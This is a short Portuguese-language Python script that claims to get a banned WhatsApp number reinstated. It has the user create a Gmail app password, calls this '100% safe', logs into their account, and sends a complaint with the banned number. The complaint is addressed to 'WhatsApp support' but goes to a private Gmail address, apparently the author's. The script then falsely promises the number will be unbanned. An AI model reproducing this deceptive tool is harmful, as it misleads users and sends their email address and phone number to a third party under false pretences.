import smtplib
import email.message


#banner
print ('███╗░░██╗██╗░░░██╗███╗░░░███╗██████╗░███████╗██████╗░')
print ('████╗░██║██║░░░██║████╗░████║██╔══██╗██╔════╝██╔══██╗')
print ('██╔██╗██║██║░░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝')
print ('██║╚████║██║░░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗')
print ('██║░╚███║╚██████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║')
print ('╚═╝░░╚══╝░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝')
print ('                                                     ')
print ('██████╗░███████╗░██████╗██████╗░░█████╗░███╗░░██╗')
print ('██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗████╗░██║')
print ('██║░░██║█████╗░░╚█████╗░██████╦╝███████║██╔██╗██║')
print ('██║░░██║██╔══╝░░░╚═══██╗██╔══██╗██╔══██║██║╚████║')
print ('██████╔╝███████╗██████╔╝██████╦╝██║░░██║██║░╚███║')
print ('╚═════╝░╚══════╝╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝')
print ('                                                     ')
#prime 
print ('█▀█ █▀█ █ █▀▄▀█ █▀▀')
print ('█▀▀ █▀▄ █ █░▀░█ ██▄')
print ('')
#banner by
print ('█▀▀▄ █░░█ 　 █▀▀ █░░ █▀▀█ █░░█ █▀▀ █▀▀█ ')
print ('█▀▀▄ █▄▄█ 　 ▀▀█ █░░ █▄▄█ █▄▄█ █▀▀ █▄▄▀ ')
print ('▀▀▀░ ▄▄▄█ 　 ▀▀▀ ▀▀▀ ▀░░▀ ▄▄▄█ ▀▀▀ ▀░▀▀ ')



#auto

a = input('coloque o seu email:')
print('')
print('Ative a verificaçao de duas etapas, apos isso, ative a opçao senha de apps, crie uma senha para o seu email. Agora coloque a senha.')
print('')
b = input('coloque a sua senha de app:')
print('')
print('tudo pronto, a senha pode ser usada apenas para usar o seu email. Este método e 100% seguro!')
print('')
print('seu email: {}' .format (a))
print('sua senha de email: {}' .format (b))
print('salve as informaçoes acima!')
c = input('coloque o numero banido:')

#email
def enviar_email():
    corpo_email = f'Olá suporte do whatsapp!, meu numero de whatsapp foi banido injustamente! por meios ilegais!! Tenho provas que o meu numero foi banido injustamente!! o numero banido foi {c}'
    msg = email.message.Message()
    msg['Subject'] = 'Olá suporte do whatsapp!'
    msg['From'] = f'{a}'
    msg['To'] = 'slayerandkr@gmail.com'
    password = f'{b}'
    msg.add_header ('Content-Type', 'text/html')
    msg.set_payload(corpo_email )
#login
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('o numero sera desbanido em breve.')
enviar_email()